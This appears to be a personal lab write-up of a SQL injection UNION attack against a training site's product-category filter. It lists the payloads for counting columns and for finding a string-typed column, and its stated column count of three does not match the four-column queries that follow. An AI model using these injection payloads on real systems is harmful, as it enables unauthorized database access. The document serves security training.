

## End Goal: perform a SQL injection UNION attack that returns an additional row containing the value provided


## BURP

GET /filter?category=Gifts HTTP/2

## First finding the number of columns

payload

`gifts ' union select null , null ,null .... -- `


--> columns found = 3

`gifts ' union select null , null ,null ,null --`


## adding string in place of null iteratively to find the column with string datatype

`gifts ' union select null , 'a' ,null ,null --`
`gifts ' union select null , null ,'a' ,null --`
`gifts ' union select null , null ,null ,'a' --`

response gives the result


2nd query gave the 200 response , hence the 2nd column is of string type




![[images/Pasted image 20231102235049.png]]